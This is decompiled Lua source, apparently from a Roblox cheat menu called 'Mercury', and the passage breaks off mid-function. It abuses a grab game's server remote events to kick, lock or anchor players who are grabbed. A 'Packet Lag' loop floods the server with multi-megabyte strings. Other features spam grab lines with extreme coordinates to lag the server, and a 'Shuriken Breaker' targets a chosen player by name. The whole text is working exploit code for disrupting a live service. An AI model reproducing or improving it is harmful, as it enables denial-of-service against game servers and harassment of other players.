	local figureLockBlock, permanentPallet, lp, ps, ws, sno, destroyLine, cf, v32, v16
	local v17, wait_, tbl5, tbl6, tbl7, tbl8, fn12, fn13, fn14, tbl9

	do
		do
			do
				local v18 = _G.GrabsTab:CreateBlock({ Name = "Grab Destroy Method", Side = "Right", ImageID = "90379866262227" })
				local states = _G.States or {}
				_G.States = states
				local ws2 = _G.WS
				local lp2 = _G.LP
				local ps2 = _G.PS
				local sno2 = _G.SNO
				local destroyLine2 = _G.DestroyLine
				local v33 = _G.V3 or Vector3.new

				if not _G.CF then
				end

				local tspawn = _G.tspawn or task.spawn
				local tcancel = _G.tcancel or task.cancel
				local twait = _G.twait or task.wait
				states.GrabDestroy = states.GrabDestroy or { method = "Kick Grab", enabled = false, thread = nil, palletThread = nil }
				local grabDestroy = states.GrabDestroy

				local function fn15(arg)
					if arg then
						arg.Velocity = v33(0, 0, 0)
						arg.AssemblyLinearVelocity = v33(0, 0, 0)
						arg.RotVelocity = v33(0, 0, 0)
						arg.AssemblyAngularVelocity = v33(0, 0, 0)
					end
				end

				local function fn16()
					grabDestroy.thread = tspawn(function()
						while grabDestroy.enabled do
							local grabParts = ws2:FindFirstChild("GrabParts")

							if grabParts then
								local grabPart = grabParts:FindFirstChild("GrabPart")

								if grabPart then
									local weldConstraint = grabPart:FindFirstChild("WeldConstraint")

									if weldConstraint and weldConstraint.Part1 then
										local part1 = weldConstraint.Part1
										local playerFromCharacter = part1.Parent and ps2:GetPlayerFromCharacter(part1.Parent)

										if playerFromCharacter and playerFromCharacter ~= lp2 then
											task.spawn(function()
												spawn(function()
													destroyLine2:FireServer(part1)
												end)

												task.wait()

												spawn(function()
													sno2:FireServer(part1, part1.CFrame)
												end)
											end)
										end
									end
								end
							end

							task.wait()
						end
					end)
				end

				local function fn17()
					grabDestroy.thread = tspawn(function()
						while grabDestroy.enabled do
							local grabParts = ws2:FindFirstChild("GrabParts")

							if grabParts then
								local grabPart = grabParts:FindFirstChild("GrabPart")

								if grabPart then
									local weldConstraint = grabPart:FindFirstChild("WeldConstraint")

									if weldConstraint and weldConstraint.Part1 then
										local part1 = weldConstraint.Part1
										local playerFromCharacter = part1.Parent and ps2:GetPlayerFromCharacter(part1.Parent)

										if playerFromCharacter and playerFromCharacter ~= lp2 then
											task.spawn(function()
												spawn(function()
													sno2:FireServer(part1, part1.CFrame)
												end)
											end)
										end
									end
								end
							end

							task.wait()
						end
					end)
				end

				local function fn18()
					grabDestroy.thread = tspawn(function()
						local v19 = nil
						local tbl10 = {}

						local function fn19(arg)
							if arg and arg.Parent then
								pcall(function()
									arg.Anchored = false
								end)

								local v20 = tbl10[arg]

								if v20 then
									pcall(function()
										arg.Transparency = v20.origTrans
									end)

									if v20.highlight and v20.highlight.Parent then
										v20.highlight:Destroy()
									end

									tbl10[arg] = nil
								end
							end
						end

						while grabDestroy.enabled do
							local grabParts = ws2:FindFirstChild("GrabParts")
							grabParts = grabParts and grabParts:FindFirstChild("GrabPart")
							local part1 = nil

							if grabParts then
								local weldConstraint = grabParts:FindFirstChild("WeldConstraint")
								local part12 = weldConstraint and weldConstraint.Part1
								part1 = nil

								if part12 then
									part1 = weldConstraint.Part1
								end
							end

							if part1 and part1.Parent then
								v19 = part1
							elseif v19 and v19.Parent then
								local flag7 = false

								for k in pairs(tbl10) do
									if k == v19 then
										flag7 = true
										break
									end
								end

								if not flag7 then
									local flag8 = false

									for i = 1, 30 do
										pcall(function()
											sno2:FireServer(v19, v19.CFrame)
										end)

										local partOwner = v19:FindFirstChild("PartOwner")

										if partOwner and partOwner.Value == lp2.Name then
											flag8 = true
											break
										else
											twait()
										end
									end

									if flag8 then
										pcall(function()
											v19.Anchored = true
											local transparency = v19.Transparency
											v19.Transparency = 0.5
											local highlight = Instance.new("Highlight")
											highlight.Name = "AnchorGrabHighlight"
											highlight.Adornee = v19
											highlight.FillTransparency = 1
											highlight.OutlineColor = Color3.new(0, 0, 0)
											highlight.OutlineTransparency = 0
											highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
											highlight.Parent = v19
											tbl10[v19] = { origTrans = transparency, highlight = highlight }
										end)
									end
								end

								v19 = nil
							end

							for k in pairs(tbl10) do
								if not k.Parent then
									fn19(k)
								else
									local partOwner = k:FindFirstChild("PartOwner")

									if not partOwner or partOwner.Value == "" or partOwner.Value ~= lp2.Name then
										fn19(k)
									end
								end
							end

							task.wait()
						end

						for k in pairs(tbl10) do
							fn19(k)
						end
					end)
				end

				local function fn19()
					local permanentPallet2 = states.PermanentPallet
					permanentPallet2 = permanentPallet2 and permanentPallet2.currentPallet
					local soundPart = permanentPallet2 and permanentPallet2:FindFirstChild("SoundPart")
					if not soundPart then
						return
					end
					local tbl10 = {}
					local v19 = nil

					local function fn20(arg)
						for _, descendant in ipairs(arg:GetDescendants()) do
							if descendant:IsA("BasePart") then
								local partOwner = descendant:FindFirstChild("PartOwner")
								if partOwner and partOwner.Value == lp2.Name then
									return true
								end
							end
						end

						return false
					end

					grabDestroy.thread = tspawn(function()
						while grabDestroy.enabled do
							local grabParts = ws2:FindFirstChild("GrabParts")

							if grabParts then
								local grabPart = grabParts:FindFirstChild("GrabPart")

								if grabPart then
									local weldConstraint = grabPart:FindFirstChild("WeldConstraint")

									if weldConstraint and weldConstraint.Part1 then
										local part1 = weldConstraint.Part1
										local parent = part1 and part1.Parent
										local playerFromCharacter = parent and ps2:GetPlayerFromCharacter(parent)

										if playerFromCharacter and playerFromCharacter ~= lp2 then
											task.spawn(function()
												spawn(function()
													sno2:FireServer(part1, part1.CFrame)
												end)
											end)

											if parent then
												v19 = parent
												tbl10[parent] = true
											end
										end
									end
								end
							end

							for k in pairs(tbl10) do
								if k and k.Parent and fn20(k) then
									for _, v20 in ipairs({
										"Head",
										"HumanoidRootPart",
										"Torso",
										"UpperTorso",
										"LowerTorso",
										"Left Arm",
										"Right Arm",
										"Left Leg",
										"Right Leg",
									}) do
										local v21 = k:FindFirstChild(v20)

										if v21 then
											pcall(function()
												fn15(v21)
											end)
										end
									end
								else
									tbl10[k] = nil
								end
							end

							task.wait()
						end
					end)

					grabDestroy.palletThread = tspawn(function()
						while grabDestroy.enabled do
							if soundPart and soundPart.Parent and v19 and v19.Parent then
								local head = v19:FindFirstChild("Head")

								if head then
									pcall(function()
										soundPart.CFrame = head.CFrame
									end)
								end
							end

							task.wait(0.1)
						end
					end)
				end

				local function fn20()
					grabDestroy.enabled = false

					if grabDestroy.thread then
						tcancel(grabDestroy.thread)
						grabDestroy.thread = nil
					end

					if grabDestroy.palletThread then
						tcancel(grabDestroy.palletThread)
						grabDestroy.palletThread = nil
					end
				end

				local function fn21()
					grabDestroy.enabled = true

					if grabDestroy.method == "Kick Grab" then
						fn16()
					elseif grabDestroy.method == "Lock Grab" then
						fn17()
					elseif grabDestroy.method == "Anchor Grab" then
						fn18()
					elseif grabDestroy.method == "Slowed Grab" then
						fn19()
					end
				end

				v18:CreateDropdown({
					Name = "Method",
					Items = { "Kick Grab", "Lock Grab", "Anchor Grab", "Slowed Grab" },
					Default = "Kick Grab",
					Callback = function(method)
						grabDestroy.method = method

						if grabDestroy.enabled then
							fn20()
							fn21()
						end
					end,
				})

				v18:CreateToggle({
					Name = "Enable Grab Method",
					Default = false,
					Callback = function(arg)
						if arg then
							fn21()
						else
							fn20()
						end
					end,
				})
			end

			do
				local v18 = _G.ServerTab:CreateBlock({ Name = "Packet Lag [strongest]", Side = "Left", ImageID = "9158731033" })
				v18:CreateSection("It is advisable to set a larger interval!")
				_G.States = _G.States or {}
				local HttpService = game:GetService("HttpService")

				if not isfolder("Mercury") then
					makefolder("Mercury")
				end

				local tbl10 = { MercurySP = "❤️❤️❤️❤️❤️😘😘😘😘😍😍😍😍❤️❤️❤️❤️❤️😘😘😘😘😍😍😍😍❤️❤️❤️❤️❤️😘😘😘😘😍😍😍😍❤️❤❤" }
				local tbl11 = {}
				local tbl12 = {}

				local function fn15()
					pcall(function()
						writefile("Mercury/Packets.json", HttpService:JSONEncode(tbl11))
					end)
				end

				local function fn16()
					if isfile("Mercury/Packets.json") then
						local ok, result = pcall(function()
							return HttpService:JSONDecode(readfile("Mercury/Packets.json"))
						end)

						if ok and type(result) == "table" then
							tbl11 = result
						end
					end
				end

				local function fn17()
					table.clear(tbl12)

					for k, v19 in pairs(tbl10) do
						tbl12[k] = v19
					end

					for k, v19 in pairs(tbl11) do
						tbl12[k] = v19
					end
				end

				fn16()
				fn17()

				local function fn18()
					local tbl13 = {}

					for k in pairs(tbl12) do
						table.insert(tbl13, k)
					end

					table.sort(tbl13)
					return tbl13
				end

				local str5 = "MercurySP"
				local mercurySP = tbl12[str5]
				local str6 = "My Packet"
				local str7 = ""

				_G.States.PacketLag = {
					enabled = false,
					packetSize = 2000000,
					interval = 0.2,
					loopThread = nil,
					packetString = mercurySP,
				}

				local function fn19(arg)
					local v19 = fn18()

					if arg and arg.Refresh then
						arg:Refresh(v19, str5)
					end
				end

				local function fn20()
					if _G.States.PacketLag.loopThread then
						task.cancel(_G.States.PacketLag.loopThread)
						_G.States.PacketLag.loopThread = nil
					end

					_G.States.PacketLag.enabled = false
				end

				local function fn21()
					_G.States.PacketLag.enabled = true

					_G.States.PacketLag.loopThread = task.spawn(function()
						local extendGrabLine = _G.RepS:WaitForChild("GrabEvents"):WaitForChild("ExtendGrabLine")

						while _G.States.PacketLag.enabled do
							local str8 = string.rep(_G.States.PacketLag.packetString, math.floor(_G.States.PacketLag.packetSize / #_G.States.PacketLag.packetString))
							extendGrabLine:FireServer(str8)
							task.wait(_G.States.PacketLag.interval)
						end
					end)
				end

				v18:CreateSlider({
					Name = "Packet Size",
					Min = 5000,
					Max = 9000000,
					Default = 2000000,
					Callback = function(packetSize)
						_G.States.PacketLag.packetSize = packetSize
					end,
				})

				v18:CreateSlider({
					Name = "Interval [seconds]",
					Min = 0.005,
					Max = 0.6,
					Default = 0.2,
					DecimalPlaces = 3,
					Callback = function(interval)
						_G.States.PacketLag.interval = interval

						if _G.States.PacketLag.enabled then
							fn20()
							fn21()
						end
					end,
				})

				local v19 = v18:CreateDropdown({
					Name = "Select Packet String",
					Items = fn18(),
					Default = "MercurySP",
					Callback = function(arg)
						str5 = arg
						mercurySP = tbl12[arg]
						_G.States.PacketLag.packetString = mercurySP

						if _G.States.PacketLag.enabled then
							fn20()
							fn21()
						end
					end,
				})

				v18:CreateInput({
					Name = "New Packet Name",
					Default = "",
					Placeholder = "Enter packet name...",
					Callback = function(arg)
						str6 = arg
					end,
				})

				v18:CreateInput({
					Name = "Packet String (symbols)",
					Default = "",
					Placeholder = "Enter symbols...",
					Callback = function(arg)
						str7 = arg
					end,
				})

				v18:CreateButton({
					Name = "Save Current Packet Config",
					Callback = function()
						if str6 == "" or str6 == nil then
							return
						end

						if str7 == "" or str7 == nil then
							return
						end
						tbl11[str6] = str7
						fn15()
						fn17()
						fn19(v19)
					end,
				})

				v18:CreateButton({
					Name = "Delete Selected Packet Config",
					Callback = function()
						if tbl10[str5] then
							return
						end

						if tbl11[str5] then
							tbl11[str5] = nil
							fn15()
							fn17()
							str5 = "MercurySP"
							mercurySP = tbl12.MercurySP
							_G.States.PacketLag.packetString = mercurySP
							fn19(v19)
						end
					end,
				})

				v18:CreateKeybind({
					Name = "Send Packet",
					Default = Enum.KeyCode.M,
					Flag = "SendPacketBind",
					Callback = function()
						local grabEvents = _G.RepS:FindFirstChild("GrabEvents")

						if grabEvents then
							local extendGrabLine = grabEvents:FindFirstChild("ExtendGrabLine")

							if extendGrabLine then
								local str8 = string.rep(_G.States.PacketLag.packetString, math.floor(_G.States.PacketLag.packetSize / #_G.States.PacketLag.packetString))
								extendGrabLine:FireServer(str8)
							end
						end
					end,
				})

				v18:CreateSection("recommend use the default packages!")

				v18:CreateToggle({
					Name = "Auto Packet",
					Default = false,
					Callback = function(arg)
						if arg then
							fn21()
						else
							fn20()
						end
					end,
				})
			end

			_G.RightBlock = _G.ServerTab:CreateBlock({ Name = "Line configurations", Side = "Right", ImageID = "79883869906488" })

			do
				local rightBlock = _G.RightBlock
				local states = _G.States
				local repS = _G.RepS
				local ws2 = _G.WS
				local lp2 = _G.LP

				local serverLag = states.ServerLag or {
					enabled = false,
					power = 1,
					loopThread = nil,
					waitTime = 0,
					mode = "Monster line [shift lag+]",
				}

				states.ServerLag = serverLag
				_G.ServerLag = serverLag

				rightBlock:CreateDropdown({
					Name = "line settings",
					Items = {
						"Base [high lag]",
						"Obsalutely Line [shift Lag]",
						"Monster line [shift lag+]",
						"Crazy Line [Head]",
					},
					Default = "Monster line [shift lag+]",
					Callback = function(mode)
						serverLag.mode = mode
					end,
				})

				rightBlock:CreateSlider({
					Name = "Spam Speed [Interval]",
					Min = 0,
					Max = 0.3,
					Default = 0,
					Callback = function(waitTime)
						serverLag.waitTime = waitTime
					end,
				})

				rightBlock:CreateToggle({
					Name = "Apply Spam Line ",
					Default = false,
					Callback = function(enabled)
						serverLag.enabled = enabled

						if enabled then
							serverLag.loopThread = task.spawn(function()
								local grabEvents = repS:FindFirstChild("GrabEvents")
								if not grabEvents then
									return
								end
								local createGrabLine = grabEvents:FindFirstChild("CreateGrabLine")
								if not createGrabLine then
									return
								end

								while serverLag.enabled do
									local spawnLocation = ws2:FindFirstChild("SpawnLocation") or ws2:FindFirstChild("Spawn") or lp2.Character and lp2.Character:FindFirstChild("HumanoidRootPart")

									if spawnLocation then
										if serverLag.mode == "Base [high lag]" then
											createGrabLine:FireServer(spawnLocation, CFrame.new(0, 9e9, 0))
										elseif serverLag.mode == "Obsalutely Line [shift Lag]" then
											local n25 = math.random(-9e9, 9e9)
											local n26 = math.random(-9e9, 9e9)
											createGrabLine:FireServer(spawnLocation, CFrame.new(n25, 0, n26), CFrame.new(n25, 0, n26))
										elseif serverLag.mode == "Monster line [shift lag+]" then
											local n25 = math.random(-9.99e13, 9.99e13)
											local n26 = math.random(-9.99e13, 9.99e13)
											local cframe = CFrame.Angles(0, 0, 0)
											local y

											if spawnLocation:IsA("BasePart") then
												y = spawnLocation.Position.Y
											else
												y = 0

												if spawnLocation:IsA("Model") then
													y = spawnLocation:GetPivot().Position.Y
												end
											end

											createGrabLine:FireServer(spawnLocation, CFrame.new(n25, y, n26) * cframe, CFrame.new(n25, y, n26) * cframe)
										elseif serverLag.mode == "Crazy Line [Head]" then
											serverLag.playerIndex = serverLag.playerIndex or 1
											local tbl10 = {}
											local v18 = ipairs
											local Players = game:GetService("Players")

											for _, player in v18(Players:GetPlayers()) do
												if player ~= lp2 and player.Character then
													local head = player.Character:FindFirstChild("Head")

													if head then
														table.insert(tbl10, { player = player, head = head })
													end
												end
											end

											if #tbl10 > 0 then
												serverLag.playerIndex = serverLag.playerIndex % #tbl10 + 1
												local v19 = tbl10[serverLag.playerIndex]

												if v19 and v19.head then
													local cFrame = v19.head.CFrame
													createGrabLine:FireServer(v19.head, CFrame.new(0, 0, 0), cFrame)
												end
											end
										end
									end

									task.wait(serverLag.waitTime)
								end
							end)
						elseif serverLag.loopThread then
							task.cancel(serverLag.loopThread)
							serverLag.loopThread = nil
						end
					end,
				})
			end

			local Players, lp2, repS, cf2, v33, notify, playSound, sounds, v18, tbl10
			local v19, thread, flag7, v20, flag8, v21, v22

			do
				local serverTab = _G.ServerTab
				Players = game:GetService("Players")
				lp2 = _G.LP or Players.LocalPlayer
				repS = _G.RepS or game:GetService("ReplicatedStorage")
				game:GetService("Workspace")
				cf2 = _G.CF or CFrame.new
				v33 = _G.V3 or Vector3.new

				notify = _G.Notify or function(...)
					print(...)
				end

				playSound = _G.PlaySound or function()
				end

				sounds = _G.Sounds or {}
				local setNetworkOwner = repS:WaitForChild("GrabEvents"):WaitForChild("SetNetworkOwner")
				local stickyPartEvent = repS:WaitForChild("PlayerEvents"):WaitForChild("StickyPartEvent")
				v18 = nil
				tbl10 = {}
				v19 = nil
				thread = nil
				flag7 = false
				v20 = nil
				local tbl11 = {}
				local tbl12 = {}
				flag8 = false
				v21 = nil
				v22 = nil
				local str5 = ""
				local str6 = ""
				local str7 = ""
				local v23 = v33(2.5e38, 2.5e38, 2.5e38)
				local str8 = "Off collide"
				local n25 = 1
				local v24 = serverTab:CreateBlock({ Name = "Shuriken Breaker", Side = "Right", ImageID = "6212253422" })

				local function fn15()
					if str8 == "Kick ground" then
						return CFrame.new(0, -600033331, 12212311)
					end

					if str8 == "Custom" then
						return CFrame.new(v23)
					end
					return CFrame.new(2.5e38, 2.5e38, 2.5e38)
				end

				local function createSelectionBox(adornee)
					if not adornee then
						return
					end
					local selectionBox = Instance.new("SelectionBox")
					selectionBox.Name = "ShurikenAttachOutline"
					selectionBox.Adornee = adornee
					selectionBox.Color3 = Color3.fromRGB(0, 0, 0)
					selectionBox.LineThickness = 0.1
					selectionBox.Transparency = 0
					selectionBox.Parent = adornee
					return selectionBox
				end

				local function fn16(arg)
					if not arg then
						return
					end
					local shurikenAttachOutline = arg:FindFirstChild("ShurikenAttachOutline")

					if shurikenAttachOutline then
						shurikenAttachOutline:Destroy()
					end
				end

				local function fn17(arg)
					if not arg or not arg.Parent then
						return
					end
					local v25 = tbl12[arg]

					if v25 ~= nil then
						pcall(function()
							arg.Transparency = v25
						end)
					end

					tbl12[arg] = nil
				end

				local function fn18(arg)
					if not arg then
						return
					end
					fn16(arg)
					fn17(arg)
				end

				local function fn19(arg, arg2, arg3, arg4)
					if not arg or not arg.Parent or not arg2 then
						return
					end
					local stickyPart = arg:FindFirstChild("StickyPart")
					if not stickyPart then
						return
					end

					if setNetworkOwner then
						task.spawn(function()
							setNetworkOwner:FireServer(stickyPart, stickyPart.CFrame)
						end)
					end

					if stickyPartEvent then
						task.spawn(function()
							local v25 = stickyPartEvent
							local fireServer = v25.FireServer
							local v26 = arg4
							local v27

							if arg4 then
								v27 = v26
							else
								v27 = fn15()
							end

							fireServer(v25, stickyPart, arg2, v27)
						end)
					end

					task.wait()

					if stickyPart and stickyPart.Parent then
						for _, child in pairs(arg:GetChildren()) do
							if child:IsA("BasePart") then
								child.CanQuery = false
							end
						end
					end

					if not arg3 then
						if tbl12[arg2] == nil then
							tbl12[arg2] = arg2.Transparency
						end

						pcall(function()
							arg2.Transparency = 0.5
						end)

						createSelectionBox(arg2)
						tbl11[arg] = arg2

						task.spawn(function()
							while arg and arg.Parent do
								task.wait()
							end

							local v25 = tbl11[arg]

							if v25 then
								fn18(v25)
								tbl11[arg] = nil
							end
						end)
					end
				end

				local function fn20(arg, arg2)
					if not v22 or not v22.Parent or not arg or not arg:IsA("BasePart") then
						v22 = nil
						flag8 = false
						return
					end

					local stickyPart = v22:FindFirstChild("StickyPart")

					if stickyPart then
						local holdBP = stickyPart:FindFirstChild("HoldBP")

						if holdBP then
							holdBP:Destroy()
						end

						if setNetworkOwner then
							task.spawn(function()
								setNetworkOwner:FireServer(stickyPart, stickyPart.CFrame)
							end)
						end

						if stickyPartEvent then
							task.spawn(function()
								local v25 = stickyPartEvent
								local fireServer = v25.FireServer
								local v26 = arg2
								local v27

								if arg2 then
									v27 = v26
								else
									v27 = fn15()
								end

								fireServer(v25, stickyPart, arg, v27)
							end)
						end

						task.wait()

						if stickyPart.Parent then
							for _, child in pairs(v22:GetChildren()) do
								if child:IsA("BasePart") then
									child.CanQuery = false
								end
							end
						end
					end

					v21 = v22
					v22 = nil
					flag8 = false
					notify("Shuriken Breaker", "Shuriken create sticky Complete!", 2)
					playSound(sounds.Notify)
				end

				local function fn21()
					if flag8 then
						return
					end
					flag8 = true
					local canSpawnToy = lp2:FindFirstChild("CanSpawnToy")
					local spawnToyRemoteFunction = repS:FindFirstChild("MenuToys") and repS.MenuToys:FindFirstChild("SpawnToyRemoteFunction")
					if not canSpawnToy or not spawnToyRemoteFunction then
						flag8 = false
						return
					end
					local now2 = tick()

					while not canSpawnToy.Value do
						if not (tick() - now2 > 3) then
							task.wait()
							continue
						end
						break
					end

					local humanoidRootPart = lp2.Character and lp2.Character:FindFirstChild("HumanoidRootPart")
					if not humanoidRootPart then
						flag8 = false
						return
					end

					task.spawn(function()
						pcall(function()
							spawnToyRemoteFunction:InvokeServer("NinjaShuriken", humanoidRootPart.CFrame * cf2(0, 15, 20), v33(0, 0, 0))
						end)
					end)

					task.spawn(function()
						local now3 = tick()
						local ninjaShuriken = nil

						while not ninjaShuriken do
							if not (tick() - now3 > 3) then
								ninjaShuriken = workspace:FindFirstChild(lp2.Name .. "SpawnedInToys")
								ninjaShuriken = ninjaShuriken and ninjaShuriken:FindFirstChild("NinjaShuriken")

								if not ninjaShuriken then
									task.wait()
								end

								continue
							end

							break
						end

						if not ninjaShuriken then
							flag8 = false
							return
						end
						ninjaShuriken.Name = "AntiKick"
						v22 = ninjaShuriken
						v21 = ninjaShuriken
						local stickyPart = ninjaShuriken:WaitForChild("StickyPart", 2)

						if not stickyPart or not stickyPart.Parent then
							v22 = nil
							flag8 = false
							return
						end

						if setNetworkOwner then
							task.spawn(function()
								setNetworkOwner:FireServer(stickyPart, stickyPart.CFrame)
							end)
						end

						local bodyPosition = Instance.new("BodyPosition")
						bodyPosition.Name = "HoldBP"
						bodyPosition.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
						bodyPosition.Position = Vector3.new(stickyPart.Position.X, 10000, stickyPart.Position.Z)
						bodyPosition.D = 1000
						bodyPosition.P = 10000
						bodyPosition.Parent = stickyPart
						flag8 = false
					end)
				end

				local function fn22(arg, arg2, arg3)
					if flag8 then
						return
					end

					if not arg then
						return
					end
					flag8 = true
					local canSpawnToy = lp2:FindFirstChild("CanSpawnToy")
					local spawnToyRemoteFunction = repS:FindFirstChild("MenuToys") and repS.MenuToys:FindFirstChild("SpawnToyRemoteFunction")
					if not canSpawnToy or not spawnToyRemoteFunction then
						flag8 = false
						return
					end
					local now2 = tick()

					while not canSpawnToy.Value do
						if not (tick() - now2 > 3) then
							task.wait()
							continue
						end
						break
					end

					local humanoidRootPart = lp2.Character and lp2.Character:FindFirstChild("HumanoidRootPart")
					if not humanoidRootPart then
						flag8 = false
						return
					end

					task.spawn(function()
						pcall(function()
							spawnToyRemoteFunction:InvokeServer("NinjaShuriken", humanoidRootPart.CFrame * cf2(0, 15, 20), v33(0, 0, 0))
						end)
					end)

					task.spawn(function()
						local now3 = tick()
						local ninjaShuriken = nil

						while not ninjaShuriken do
							if not (tick() - now3 > 3) then
								ninjaShuriken = workspace:FindFirstChild(lp2.Name .. "SpawnedInToys")
								ninjaShuriken = ninjaShuriken and ninjaShuriken:FindFirstChild("NinjaShuriken")

								if not ninjaShuriken then
									task.wait()
								end

								continue
							end

							break
						end

						if not ninjaShuriken then
							flag8 = false
							return
						end
						ninjaShuriken.Name = "AntiKick"
						v21 = ninjaShuriken
						local stickyPart = ninjaShuriken:WaitForChild("StickyPart", 2)
						if not stickyPart or not stickyPart.Parent then
							flag8 = false
							return
						end
						fn19(ninjaShuriken, arg, arg2, arg3)
						notify("Shuriken Breaker", "Shuriken create sticky Complete!", 2)
						playSound(sounds.Notify)
						flag8 = false
					end)
				end

				local function fn23()
					if flag8 then
						return
					end
					flag8 = true
					local canSpawnToy = lp2:FindFirstChild("CanSpawnToy")
					local spawnToyRemoteFunction = repS:FindFirstChild("MenuToys") and repS.MenuToys:FindFirstChild("SpawnToyRemoteFunction")
					local humanoidRootPart = lp2.Character and lp2.Character:FindFirstChild("HumanoidRootPart")
					if not canSpawnToy or not spawnToyRemoteFunction or not humanoidRootPart then
						flag8 = false
						return
					end
					local tbl13 = {}

					task.spawn(function()
						for i = 1, n25 do
							local now2 = tick()

							while not canSpawnToy.Value do
								if not (tick() - now2 > 3) then
									task.wait()
									continue
								end
								break
							end

							task.spawn(function()
								pcall(function()
									spawnToyRemoteFunction:InvokeServer("NinjaShuriken", humanoidRootPart.CFrame * cf2(0, 15, 20), v33(0, 0, 0))
								end)
							end)

							local now3 = tick()
							local ninjaShuriken = nil

							while not ninjaShuriken do
								if not (tick() - now3 > 3) then
									ninjaShuriken = workspace:FindFirstChild(lp2.Name .. "SpawnedInToys")
									ninjaShuriken = ninjaShuriken and ninjaShuriken:FindFirstChild("NinjaShuriken")

									if not ninjaShuriken then
										task.wait()
									end

									continue
								end

								break
							end

							if ninjaShuriken then
								ninjaShuriken.Name = "AntiKickLag"
								local stickyPart = ninjaShuriken:WaitForChild("StickyPart", 2)

								if stickyPart and setNetworkOwner then
									task.spawn(function()
										setNetworkOwner:FireServer(stickyPart, stickyPart.CFrame)
									end)

									local n26 = 80000

									if n25 > 1 then
										n26 = 80000 - (i - 1) * 15000 / (n25 - 1)
									end

									local bodyPosition = Instance.new("BodyPosition")
									bodyPosition.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
									bodyPosition.P = 50000
									bodyPosition.D = 100
									bodyPosition.Position = humanoidRootPart.Position + Vector3.new(0, n26, 0)
									bodyPosition.Parent = stickyPart
									local bodyGyro = Instance.new("BodyGyro")
									bodyGyro.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
									bodyGyro.P = 50000
									bodyGyro.D = 100
									bodyGyro.CFrame = stickyPart.CFrame
									bodyGyro.Parent = stickyPart
									table.insert(tbl13, stickyPart)
								end
							end
						end

						task.wait(0.1)
						local spawnLocation = workspace:WaitForChild("SpawnLocation", 9e9)
						local cframe = CFrame.new(2.3e9, 0, 2.3e9)

						for _, v25 in ipairs(tbl13) do
							if stickyPartEvent then
								task.spawn(function()
									stickyPartEvent:FireServer(v25, spawnLocation, cframe)
								end)
							end
						end

						task.wait()

						for _, descendant in pairs(workspace:GetDescendants()) do
							if descendant.Name == "AntiKickLag" then
								descendant:Destroy()
							end
						end

						notify("Shuriken Breaker", tostring(#tbl13) .. " shurikens has lagging", 2)
						playSound(sounds.Notify)
						flag8 = false
					end)
				end

				local function fn24(arg)
					if not v18 then
						return
					end
					local character = v18.Character
					if not character or not character:FindFirstChild("HumanoidRootPart") then
						return
					end
					local humanoid = character:FindFirstChild("Humanoid")
					if humanoid and humanoid.Health <= 0 then
						return
					end
					local head = character:FindFirstChild("Head") or character:FindFirstChild("HumanoidRootPart")

					if head then
						fn22(head, true, arg)
					end
				end

				local function fn25(arg)
					local str9 = arg and string.lower(arg) or ""
					local tbl13 = {}
					local str10 = lp2.DisplayName .. " | " .. lp2.Name .. " (Yourself)"

					if str9 == "" or string.find(string.lower(str10), str9, 1, true) then
						table.insert(tbl13, str10)
					end

					for _, player in pairs(Players:GetPlayers()) do
						if player ~= lp2 then
							local str11 = player.DisplayName .. " | " .. player.Name

							if str9 == "" or string.find(string.lower(str11), str9, 1, true) then
								table.insert(tbl13, str11)
							end
						end
					end

					table.sort(tbl13)
					return tbl13
				end

				local function fn26(arg)
					local v25 = fn25(arg)
					tbl10 = v25

					if v19 then
						v19:Refresh(v25)
					end
				end

				v24:CreateInput({
					Name = "Search player",
					Default = "",
					Placeholder = "Type to search...",
					Callback = function(arg)
						fn26(arg)
					end,
				})

				v19 = v24:CreateDropdown({
					Name = "Select player",
					Items = tbl10,
					Default = "",
					Callback = function(arg)
						if not arg or arg == "" then
							v18 = nil
							v21 = nil
							v22 = nil
							return
						end

						local v25 = string.find(arg, "%(Yourself%)")
						local match = arg:match("%|%s*(.+)$")
						match = match and match:gsub("%s*%(Yourself%)%s*$", ""):match("^%s*(.-)%s*$")

						if v25 then
							v18 = lp2
							v21 = nil
							v22 = nil
							notify("Shuriken Breaker", "Target: Yourself", 2)
							playSound(sounds.Notify)
							return
						end

						local v26 = Players:FindFirstChild(match)

						if v26 then
							v18 = v26
							v21 = nil
							v22 = nil
							notify("Shuriken Breaker", "Target: " .. v26.DisplayName, 2)
							playSound(sounds.Notify)
						end
					end,
				})

				v24:CreateDropdown({
					Name = "Select method break",
					Items = { "Off collide", "Kick ground", "Custom" },
					Default = "Off collide",
					Callback = function(arg)
						str8 = arg
					end,
				})

				v24:CreateSlider({
					Name = "Sticky lag shurikens [Count]",
					Min = 1,
					Max = 15,
					Default = 1,
					Callback = function(arg)
						n25 = arg
					end,
				})

				v24:CreateButton({
					Name = "Start Sticky Lags [Ping]",
					Callback = function()
						fn23()
					end,
				})

				v24:CreateKeybind({
					Name = "Break to Player",
					Default = Enum.KeyCode.One,
					HoldToInteract = false,
					Callback = function()
						fn24(CFrame.new(2.5e38, 2.5e38, 2.5e38))
					end,
				})

				v24:CreateKeybind({
					Name = "Attach to Object (crosshair)",
					Default = Enum.KeyCode.V,
					HoldToInteract = false,
					Callback = function()
						if not lp2.Character then
							return
						end
						local currentCamera = workspace.CurrentCamera
						if not currentCamera then
							return
						end
						local mouse = lp2:GetMouse()
						if not mouse then
							return
						end
						local raycastParams = RaycastParams.new()
						raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
						raycastParams.FilterDescendantsInstances = { lp2.Character }
						raycastParams.IgnoreWater = true
						local hit = workspace:Raycast(currentCamera.CFrame.Position, (mouse.Hit.Position - currentCamera.CFrame.Position).Unit * 999999999, raycastParams)

						if hit then
							fn22(hit.Instance, false)
						end
					end,
				})

				v24:CreateInput({
					Name = "Offset X",
					Default = "",
					Placeholder = "",
					Callback = function(arg)
						str5 = arg
					end,
				})

				v24:CreateInput({
					Name = "Offset Y",
					Default = "",
					Placeholder = "",
					Callback = function(arg)
						str6 = arg
					end,
				})

				v24:CreateInput({
					Name = "Offset Z",
					Default = "",
					Placeholder = "",
					Callback = function(arg)
						str7 = arg
					end,
				})

				v24:CreateButton({
					Name = "Apply custom offset",
					Callback = function()
						local num = tonumber(str5)
						local num2 = tonumber(str6)
						local num3 = tonumber(str7)

						if num and num2 and num3 then
							v23 = v33(num, num2, num3)
							notify("Shuriken Breaker", "Shuriken create sticky Complete!", 2)
							playSound(sounds.Notify)
						else
